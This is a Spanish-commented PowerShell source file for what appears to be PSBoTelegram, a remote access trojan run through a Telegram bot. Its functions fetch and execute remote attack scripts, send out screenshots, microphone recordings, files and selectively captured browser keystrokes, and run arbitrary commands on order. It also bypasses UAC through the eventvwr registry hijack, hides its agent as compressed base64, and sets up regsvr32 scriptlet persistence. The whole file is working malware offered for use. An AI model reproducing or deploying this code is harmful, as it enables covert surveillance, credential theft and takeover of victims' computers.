########################################################## Agent Bot Code ##########################################################

function create_agent {param ($botkey,$chat_id)
$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}

function code_a_base64 {param ($code)
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs = New-Object IO.Compression.DeflateStream ($ms,$action)
$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$code | ForEach-Object {$sw.WriteLine($_)}
$sw.Close()
$Compressed = [Convert]::ToBase64String($ms.ToArray())
$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
"`$(New-Object IO.Compression.DeflateStream (" +
"`$(New-Object IO.MemoryStream (,"+
"`$([Convert]::FromBase64String('$Compressed')))), " +
"[IO.Compression.CompressionMode]::Decompress)),"+
" [Text.Encoding]::ASCII)).ReadToEnd();"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
return $codeScript
}

$plantilla_sct = '<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'


################################################ Cargamos funciones de otros proyectos ########################################################################


$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
#IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger

############################################################# Funciones propias #############################################################

function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}

function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }

function bot-send {

param ($photo,$file,$botkey,$chat_id)

$proxy = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
$ruta = $env:USERPROFILE + "\appdata\local\temp\1"
$curl_zip = $ruta + "\curl_752_1.zip"
$curl = $ruta + "\" + "curl.exe"
$curl_mod = $ruta + "\" + "curl_mod.exe"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("http://www.paehl.com/open_source/?download=curl_752_1_ssl.zip","$curl_zip")
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$ruta") | Out-Null

Disable-Smartscreen -File $curl -Output $curl_mod
Remove-Item $curl ; Remove-Item $curl_zip
}

if ($file -ne $null) {
$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden}

if ($photo -ne $null){

$proceso = $curl_mod
$uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
if ($proxy -ne $null) {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k ' + '--proxy ' + $proxy } else {$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '}
Start-Process $proceso -ArgumentList $argumenlist -WindowStyle Hidden

}

}

function get-info {$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME 
$Bios = Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME 
$sheetS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME 
$sheetPU = Get-WmiObject -Class Win32_Processor -ComputerName $env:COMPUTERNAME 
$drives = Get-WmiObject -ComputerName $env:COMPUTERNAME Win32_LogicalDisk  | Where-Object {$_.DriveType -eq 3}
$pingStatus = Get-WmiObject  -Query "Select * from win32_PingStatus where Address='$env:COMPUTERNAME'  "
$IPAddress= (Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:COMPUTERNAME  | ? {$_.ipenabled}).ipaddress 
$OSRunning = $OS.caption + " " + $OS.OSArchitecture + " SP " + $OS.ServicePackMajorVersion
$NoOfProcessors=$sheetS.numberofProcessors
$name=$SheetPU|select name -First 1
$Manufacturer=$sheetS.Manufacturer
$Model=$sheetS.Model
$ProcessorName=$SheetPU|select name -First 1
$Mac = (Get-WmiObject -class Win32_NetworkAdapter -ComputerName $env:COMPUTERNAME  | ? { $_.PhysicalAdapter } ).macaddress
$date = Get-Date
$uptime = $OS.ConvertToDateTime($OS.lastbootuptime)
$sheetPUInfo = $name.Name + " & has " + $sheetPU.NumberOfCores + " Cores & the FSB is " + $sheetPU.ExtClock + " Mhz"
$sheetPULOAD = $sheetPU.LoadPercentage
$serialnumer = (Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME ).serialnumber
$RAM = (Get-WmiObject -class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME ).totalphysicalmemory / 1gb
$ram_round= [math]::Round($ram,0)
$MonitorModelo = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME   -Namespace root\wmi | Select @{n="Model";e={[System.Text.Encoding]::ASCII.GetString($_.UserFriendlyName -ne 00)}}).model
$MonitorSerial = (gwmi WmiMonitorID -ComputerName $env:COMPUTERNAME  -Namespace root\wmi | Select @{n="Serial";e={[System.Text.Encoding]::ASCII.GetString($_.SerialNumberID -ne 00)}}).serial
$Disco_duro = $drives.Size / 1gb ; $Disco_duro = [math]::Round($Disco_duro,0) ; $Disco_duro = "$Disco_duro Gb"
$PC = New-Object psobject -Property @{ 
"Nombre" = $env:COMPUTERNAME
"Modelo Monitor" = $MonitorModelo
"Monitor Num. Serie" = $MonitorSerial
"Sistema Operativo" = $OSRunning
"Procesador" = $name.name
"Fabricante" = $Manufacturer
"Modelo" = $Model
"Num. Procesadores" = "$NoOfProcessors"
"Memoria RAM" = "$ram_round Gb"
"Direccion IP" = [string]$IPAddress[0]
"MAC" = $mac
"Numero de serie" = $serialnumer
"Disco Duro" = $Disco_duro
}
$PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
}
function public-ip {param ($botkey)
$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFrom-Json
 $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
 "Pais" = $datos_ip_publica.country
 "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}

function bot-public {param($botkey) $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}

function screen-shot {param ($botkey,$chat)

$ruta = $env:USERPROFILE + "\AppData\Local\temp\1\" + "screenshot.png"

Add-Type -AssemblyName System.Windows.Forms
$resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
$resolucion = $resolucion -split (",")
$ancho = $resolucion[2] -replace "width="
[string]$alto = $resolucion[3] -replace "height=" ; $alto =  $alto -replace ".$" ; $alto =  $alto -replace ".$"
$ancho = [int]$ancho
$alto = [int]$alto
$horizontal = (Get-WmiObject -Class Win32_VideoController).CurrentHorizontalResolution
$vertical = (Get-WmiObject -Class Win32_VideoController).CurrentVerticalResolution
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $ancho, $alto)

function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
 }

 screenshot $bounds $ruta

bot-send -photo $ruta -botkey $botkey -chat_id $chat_id

}


function graba-audio { param ($botkey,$chat_id,$segundos)
IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
$ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
$audio = $ruta + "\" + "audio.wav"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $audio) -eq $true) {Remove-Item $audio}
Get-MicrophoneAudio -Path $audio -Length $segundos -Alias "Secret" 
bot-send -file $audio -botkey $botkey -chat_id $chat_id

}

function BypassUAC-CyberVaca {param ([string]$comando)
$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
$key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
Start-Process eventvwr.exe ; sleep -Seconds 3
Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; sleep -Seconds 10; Remove-Item $ruta }


function whoami_me {
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios : $privilegios`n"; return $usuario, $dominio, $privilegios
 }

function mimigatoz {
$ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
bot-send -file $ruta -botkey $botkey -chat_id $chat_id
Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
}


function persistence {
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
$plantilla_sct = '<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'
$plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
$texto = "Persistencia ejecutada correctamente"} return $texto;break}


function remove-persistence {
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{$texto = "Sorry, necesitas privilegios";return $texto; break }  
else {
$comando = (Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"})
$key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";$check = Get-ItemProperty $key  | Select-String "regsvr32.exe" ; 
if ($check.count -eq 0) {$texto = "Todo correcto! parece estar limpio el arranque"; return $texto; break} else {
$texto = "Eliminando persistencia"
$modifica = "" ; set-item $Key $modifica ; Remove-Item $key
Remove-Item C:\Windows\System32\update.sct; return $texto; break
}}}

function crea_keylogger { param ($extrae)
$KeyLogger = '
function extrae_credenciales {
$ErrorActionPreference = "SilentlyContinue" ; [string]$botkey = "your_token";[string]$chat_id = "your_chat_id" 
IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content ; $siempre = $true
function credenciales_web {return (Get-Process MicrosoftEdgeCP,MicrosoftEdge,firefox,chrome,iexplore | Where-Object {$_.MainWindowTitle -like "*your_extrae*"}).id }
do{ $ruta = $env:USERPROFILE + "\appdata\local\temp\1\" ; if ((Test-Path $ruta) -eq $false) {mkdir $ruta} ; $ruta = $ruta + "log.txt" ; $id = credenciales_web
if ($id -ne $null ) { Get-Keystrokes -LogPath $ruta -Timeout 1 ; $siempre = $false; sleep -Seconds 30 }
$datos = gc $ruta ; $datos = $datos | Select-String $Extrae ; $texto = $datos} while ($siempre -eq $true) $extraido = "" ; $i = 0
foreach ($dato in $datos) { $i = $i + 1 
$dato = $dato -split "," ; $dato = $dato[0] ; $dato = $dato -replace ''""'',""; $dato = $dato -replace "TypedKey" ; $extraido += $dato -replace ''"'',"" 
if ($i -eq $datos.Count) {$texto = "Resultado KeyLogger-Selective para your_extrae `n";$extraido = $extraido -replace "<Ctrl><Alt>2", "@"
$texto += $extraido
Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post
Remove-Item $ruta ;return $extraido}}} extrae_credenciales' ; $keylogger = $KeyLogger -replace "your_chat_id", $chat_id -replace "your_token" , $botkey -replace "your_extrae", $extrae ; return $KeyLogger}



function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 $help = "PSBoTelegram V0.8`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
 if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Shell*" -and $first_connect -gt 5) {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; Set-Location $ruta; del *.*; Set-Location $env:USERPROFILE ;exit}
 if ($comando -eq "/Scriptimport") {$texto = "/Scriptimport ejectuta script o comando powershell leyendo una archivo .txt desde una URL, Meterpreter, Empire...`nEjemplo: /scriptimport http://192.168.1.20/meterpreter.txt :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Scriptimport *") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Ejecutado desde $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat_id $chat_id }
 if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
 if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
 if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
 if ($comando -like "/Bypassuac" -and $first_connect -gt 5) {$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $id = (Get-Process powershell).Id;$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; BypassUAC-CyberVaca -comando $agent_bot ;  Stop-Process -id $id}
 if ($comando -like "/Persistence") {$texto = "La funcion de persistencia se ejecuta: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Persistence On") {$texto = persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Persistence Off") {$texto = remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -eq "/KeyLogger_Selective") {$texto = "Activa un KeyLogger de manera selectiva.`n Ejemplo: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/KeyLogger_Selective *") {$comando = $comando -replace "/KeyLogger_Selective ",""; $code = crea_keylogger -extrae $comando ; $code = code_a_base64 -code $code; $code = "powershell.exe -win hidden -enc " + $code
$plantilla_sct | Out-File -Encoding ascii "C:\windows\system32\log.sct"  ; IEX  'c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\log.sct scrobj.dll' ;$texto = "Lanzado Keylogger_Selective $comando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 10 ; Remove-Item C:\Windows\System32\log.sct}
 if ($comando -like "/MimiGatoz") {mimigatoz}

}
